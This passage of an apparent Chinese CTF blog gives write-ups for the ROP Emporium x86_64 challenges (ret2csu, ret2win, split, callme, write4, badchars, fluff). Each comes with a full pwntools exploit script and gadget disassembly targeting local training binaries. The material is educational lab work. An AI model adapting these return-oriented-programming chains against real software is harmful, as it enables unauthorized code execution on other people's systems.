<p><img src="5.png" alt="" /><br />
我们再回过头看一下这段代码，如果我们call之后能够安全返回，那么之后会判断rbp和rbx是否相等。我们可以控制rbp和rbx的值，因此这里的jnz我们可以跳过，方法是：将rbx赋值为0，rbp赋值为1。这样在call之后我们又可以进行一连串的pop操作。此时的pop显然并不会影响rdi,rsi,rdx的值，在ret之后接上pop rdi,ret的地址就能够将rdi成功修正，然后直接返回到ret2win函数，岂不妙哉。</p>
<p>因此，我们现在的目标是在ret2csu程序中找到一个能够安全返回且不影响rdx的代码片段。当然我们需要根据ret指令来查找。在IDA中进行查找，对每个ret指令前面的代码进行检查，判断其是否满足我们的需求。下面是找到的可能符合需求的几个代码碎片：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.init:00000000004004E2 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.init:00000000004004E6 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400588 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400589 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:00000000004005C8 5D                                            pop     rbp</span><br><span class="line">.text:00000000004005C9 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:00000000004005E2 C6 05 4F 0A 20 00 01                          mov     cs:__bss_start, 1</span><br><span class="line">.text:00000000004005E9 5D                                            pop     rbp</span><br><span class="line">.text:00000000004005EA C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400610 B8 00 00 00 00                                mov     eax, 0</span><br><span class="line">.text:0000000000400615 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400616 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400630 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400631 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400696 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.text:000000000040069A 5B                                            pop     rbx</span><br><span class="line">.text:000000000040069B 5D                                            pop     rbp</span><br><span class="line">.text:000000000040069C 41 5C                                         pop     r12</span><br><span class="line">.text:000000000040069E 41 5D                                         pop     r13</span><br><span class="line">.text:00000000004006A0 41 5E                                         pop     r14</span><br><span class="line">.text:00000000004006A2 41 5F                                         pop     r15</span><br><span class="line">.text:00000000004006A4 C3                                            retn</span><br><span class="line"></span><br><span class="line">.fini:00000000004006B4 48 83 EC 08                                   sub     rsp, 8          ; _fini</span><br><span class="line">.fini:00000000004006B8 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.fini:00000000004006BC C3                                            retn</span><br></pre></td></tr></table></figure>
<p>其中最值得我们关注的就是最后一个片段，它将rsp减8又加8，相当于没有任何变化，而前面的片段均对寄存器有或多或少的影响。于是我们使用最后一个代码片段试试看。</p>
<p>要能够成功使用代码片段，还需要在内存空间中找到一个保存着这个代码段地址的地方，因为前面已经说过，call的地址是取值拿到的，所以不能直接将地址放在寄存器中。我们在IDA中尝试搜索，没想到还真的搜索到了：</p>
<p><img src="6.png" alt="" /></p>
<p>我们只需要将r12赋值为0x4003b0，就能够完美跳过这个call并毫发无损地返回，也就有了修正第一个参数的机会。注意：此时我们会多pop掉7个参数，因此要在栈中加7个无效数。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libret2csu.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ROP_1 = <span class="number">0x40069a</span></span><br><span class="line">ROP_2 = <span class="number">0x400680</span></span><br><span class="line">rdi = <span class="number">0x4006a3</span></span><br><span class="line">call = <span class="number">0x400689</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)		<span class="comment"># pop the first argument</span></span><br><span class="line">payload += p64(ROP_1)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x4003B0</span>) + p64(<span class="number">0xdeadbeefdeadbeef</span>) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(ROP_2)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>) </span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;ret2win&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="7.png" alt="" /><br />
由此可见，在做题的过程中，转换思路很重要。一条指令可以有用，也可以无用。可能需要精心构造进入，也可能需要精心构造绕过。全方位思考，整合程序中的所有资源为己所用，方能在pwn的世界纵横捭阖，左右逢源。要学的东西，还有很多…</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ROP-Emporium-x86-64-1-6%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ROP-Emporium-x86-64-1-6%E9%A2%98/" class="post-title-link" itemprop="url">ROP Emporium x86_64 1~6题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:45:10" itemprop="dateCreated datePublished" datetime="2023-02-28T22:45:10+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:55" itemprop="dateModified" datetime="2023-03-01T11:30:55+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。</p>
<p><a target="_blank" rel="noopener" href="https://ropemporium.com/index.html">ROP Emporium</a></p>
<h1 id="1-ret2win"><a class="markdownIt-Anchor" href="#1-ret2win"></a> 1. ret2win</h1>
<p>这个没什么好说的，新手第一题水平，直接改返回地址就行。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">40</span>) + p64(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="2-split"><a class="markdownIt-Anchor" href="#2-split"></a> 2. split</h1>
<p>这道题需要调用system函数，传入正确的参数。参数在数据段已经给出，直接使用经典gadget将参数pop到rdi寄存器中即可。rdi是64位linux程序函数的第一个参数，前6个参数分别为：rdi, rsi, rdx, rcx, r8, r9，之后的参数在栈中高地址处依次保存。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useful_string = <span class="number">0x601060</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x4007c3</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>) + p64(pop_rdi_ret_addr) + p64(useful_string) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="3-callme"><a class="markdownIt-Anchor" href="#3-callme"></a> 3. callme</h1>
<p>这道题需要调用自定义库中的三个函数，这3个函数首先都对传入的前三个参数进行了检查。我们只需要在ROP里面将参数传进去即可。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4009a3</span></span><br><span class="line">rsirdx = <span class="number">0x40093d</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_one&#x27;</span>])</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_two&#x27;</span>])</span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(rsirdx) + p64(<span class="number">0xcafebabecafebabe</span>) + p64(<span class="number">0xd00df00dd00df00d</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;callme_three&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="4-write4"><a class="markdownIt-Anchor" href="#4-write4"></a> 4. write4</h1>
<p>这一题虽然有一个print_file函数，但是对应的参数在write4文件中没有给出，需要我们自己构造。仔细使用IDA观察会发现，程序特地给了我们一个gadget实现任意地址写。bss段或data段能够作为我们构造的字符串’flag.txt’的存放位置，那么我们就将这个字符串写到这些可写段中，再将其作为参数传入print_file函数即可。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">useful_gadget = <span class="number">0x400628</span></span><br><span class="line">r14r15 = <span class="number">0x400690</span></span><br><span class="line">rdi = <span class="number">0x400693</span></span><br><span class="line">write_addr = <span class="number">0x601028</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(r14r15) + p64(write_addr) + <span class="string">b&#x27;flag.txt&#x27;</span></span><br><span class="line">payload += p64(useful_gadget)</span><br><span class="line">payload += p64(r14r15) + p64(write_addr + <span class="number">8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(useful_gadget)</span><br><span class="line">payload += p64(rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="5-badchars"><a class="markdownIt-Anchor" href="#5-badchars"></a> 5. badchars</h1>
<p>这道题的pwnme函数中添加了一个检查，不允许出现’x’、‘a’、‘g’、'.'这4个字符。但是程序中给出了任一地址加减的gadget，我们先写入其他值，然后通过加减将这个值变成我们想要的值就可以了。但是这里需要注意一点：如果在data段的开头——0x601028写入，程序会崩溃。因为我们需要绕过’x’字符，就势必在应该写入x的地方一开始不能写入x。如果在此处写字符串，那么字符’x’的位置应该在0x60102E，但是 <strong>2E正好是’.'的ASCII码，会被强制转换，从而导致ROP失败。</strong> 不过我们还是可以在0x601030写入。</p>
<p>这里提供一个ROP调试的省时小技巧。当我们构造的ROP多次失败时，如果这个ROP是一次注入，那么我们是无法进行调试的。这种情况下我们可以在ROP中间插入一个有反馈的代码段地址，如main函数开头。我们将这个main函数开头插入到ROP的不同位置，从前往后查找，前面的ROP如果正常执行，那么我们可以及时地得到反馈，如果错误则会崩溃，我们就会知道哪一步ROP之前出了错误。如此从前往后，我们就可以找到，到底是哪一步ROP有问题，从而进行修改。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line"></span><br><span class="line">xor_r14r15 = <span class="number">0x400628</span></span><br><span class="line">add_r14r15 = <span class="number">0x40062c</span></span><br><span class="line">sub_r14r15 = <span class="number">0x400630</span></span><br><span class="line">mov_r12r13 = <span class="number">0x400634</span></span><br><span class="line">pop_r12r13r14r15 = <span class="number">0x40069c</span></span><br><span class="line">pop_r14r15 = <span class="number">0x4006a0</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a3</span></span><br><span class="line">write_addr = <span class="number">0x601030</span></span><br><span class="line"></span><br><span class="line">badchars = <span class="string">&#x27;xga.&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload += p64(pop_r12r13r14r15) + <span class="string">b&#x27;flbh/tyt&#x27;</span> + p64(write_addr) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">2</span>)		<span class="comment"># a-&gt;b g-&gt;h .-&gt;/ x-&gt;y then just -1</span></span><br><span class="line">payload += p64(mov_r12r13)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">3</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">4</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_r14r15) + p64(<span class="number">1</span>) + p64(write_addr + <span class="number">6</span>)</span><br><span class="line">payload += p64(sub_r14r15)</span><br><span class="line">payload += p64(pop_rdi) + p64(write_addr)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="6-fluff"><a class="markdownIt-Anchor" href="#6-fluff"></a> 6. fluff</h1>
<p>这题和上题唯一的区别就是给的gadget不同。但是这个gadget可谓是花里胡哨。3个指令都不熟悉。查！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400628 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400628</span><br><span class="line">.text:0000000000400628 questionableGadgets:</span><br><span class="line">.text:0000000000400628                 xlat</span><br><span class="line">.text:0000000000400629                 retn</span><br><span class="line">.text:000000000040062A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040062A                 pop     rdx</span><br><span class="line">.text:000000000040062B                 pop     rcx</span><br><span class="line">.text:000000000040062C                 add     rcx, 3EF2h</span><br><span class="line">.text:0000000000400633                 bextr   rbx, rcx, rdx</span><br><span class="line">.text:0000000000400638                 retn</span><br><span class="line">.text:0000000000400639 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400639                 stosb</span><br><span class="line">.text:000000000040063A                 retn</span><br><span class="line">.text:000000000040063A ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>xlat指令：将[rbx+al]的值赋值给al，这里的64位解析出来gdb显示为xlatb，赋值后rax高位不变。<br />
bextr指令：byte extract。bextr dest src1 src2<br />
<code>dest = (src1 &gt;&gt; (src2 &amp; 0xFF)) &amp; (1 &lt;&lt; ((src2 &gt;&gt; 8) &amp; 0xFF) - 1)</code><br />
即src2的次低字节表示提取bit位数，最低字节表示提取bit位起始处。将src1提取src2中指定的比特位并赋值到dest中。<br />
例如本题中的 bextr rbx rcx rdx，设rcx = 0b10101100 01011101 00010001 11100111，rdx = 0x0509，则提取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">								 98 76543210</span><br><span class="line">rcx = 0b 10101100 01011101 00010001 11100111</span><br><span class="line">							 [   ]</span><br><span class="line">rbx = 0x8</span><br></pre></td></tr></table></figure>
<p>stosb指令：将al赋值给[rdi]</p>
<p>通过上述3个指令，我们需要怎样构造flag.txt字符串呢？</p>
<p>注意到，能够将寄存器的值赋值到内存中的只有stosb指令，在__libc_csu_init函数中有pop rdi; ret的gadget，我们因此可以控制stosb指令将al的值写到哪里。接下来就需要思考如何将正确的值写入al中了。正好xlat指令提供了解决方案，可以将内存中的一个值写入al。但首先，我们需要控制rbx的值，这样才能够在内存中寻找正确的字节。而对于rbx，我们又可以使用bextr指令，控制rcx和rdx后，我们可以在rbx中写入任意值。这样，整个利用的流程也就清晰了。修改rbx -&gt; 修改al -&gt; 修改内存。</p>
<p>在pwnme函数返回时，rax的值为0xb，是一个较小的值。我们可以在rbx中写入LOAD段中有一块全为0的起始地址，这样就能够将rax赋值为0，便于进行后续操作。</p>
<p>之后就是一个字符一个字符地转存到.bss段中即可。注意：stosb指令执行后rdi会自增，因此只需要写一个rdi赋值的gadget即可。</p>
<p>在赋值过程中，我们似乎可以在每赋值一个字节之后就将rax清零，然后精准定位下一个字节。但是构造完毕之后会发现，整个gadget的长度已经超过了写入的限制——0x200。因此我们需要利用上一个字节的值定位下一个字节的值。在一个字节写入完毕后，rax的值应该为这个字节对应的ASCII码，我们需要在rbx中再减去这个ASCII码值，一样可以定位到下一个字节的位置。同时要注意代码中对rcx本身加上了一个值，也要减去。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">xlat = <span class="number">0x400628</span></span><br><span class="line">bextr = <span class="number">0x40062A</span></span><br><span class="line">stosb = <span class="number">0x400639</span></span><br><span class="line">zero_seg = <span class="number">0x600fa0</span>			<span class="comment"># \x00 in this place</span></span><br><span class="line">write_addr = <span class="number">0x601038</span></span><br><span class="line">rdi = <span class="number">0x4006A3</span></span><br><span class="line">main_addr = <span class="number">0x400607</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address of char &#x27;f&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;, &#x27;.&#x27;, &#x27;t&#x27;, &#x27;x&#x27;, &#x27;t&#x27;</span></span><br><span class="line"><span class="comment"># you can view the hex in window &#x27;Hex View-1&#x27; in IDA_PRO to find the bytes you want </span></span><br><span class="line">char_addr = [<span class="number">0x4003C4</span>, <span class="number">0x4003C1</span>, <span class="number">0x4003D6</span>, <span class="number">0x4003CF</span>, <span class="number">0x4003C9</span>, <span class="number">0x4003D8</span>, <span class="number">0x400246</span>, <span class="number">0x4003D8</span>]</span><br><span class="line"><span class="comment"># ASCII value of each byte</span></span><br><span class="line">char = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;flag.txt&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(char)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload += p64(rdi) + p64(write_addr)			<span class="comment"># make rdi point to address needed to write</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make &#x27;f&#x27; into 0x601038</span></span><br><span class="line"><span class="comment"># gdb tell us that after gadget for rdi, rax should be 0xb, so we minus 0xb to make rax = 0</span></span><br><span class="line">payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(zero_seg - <span class="number">0x3EF2</span> - <span class="number">0xb</span>)		<span class="comment"># start = 0, len = 0x20, equals mov rbx, rcx</span></span><br><span class="line">payload += p64(xlat)</span><br><span class="line">payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(char_addr[<span class="number">0</span>] - <span class="number">0x3EF2</span>)</span><br><span class="line">payload += p64(xlat)</span><br><span class="line">payload += p64(stosb)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	payload += p64(bextr) + p64(<span class="number">0x2000</span>) + p64(char_addr[i + <span class="number">1</span>] - char[i] - <span class="number">0x3EF2</span>)		<span class="comment"># to get the right value</span></span><br><span class="line">	payload += p64(xlat)</span><br><span class="line">	payload += p64(stosb)</span><br><span class="line"></span><br><span class="line">payload += p64(rdi) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/picoctf-2022%E9%83%A8%E5%88%86write-ups/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/picoctf-2022%E9%83%A8%E5%88%86write-ups/" class="post-title-link" itemprop="url">picoctf-2022部分write-ups</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
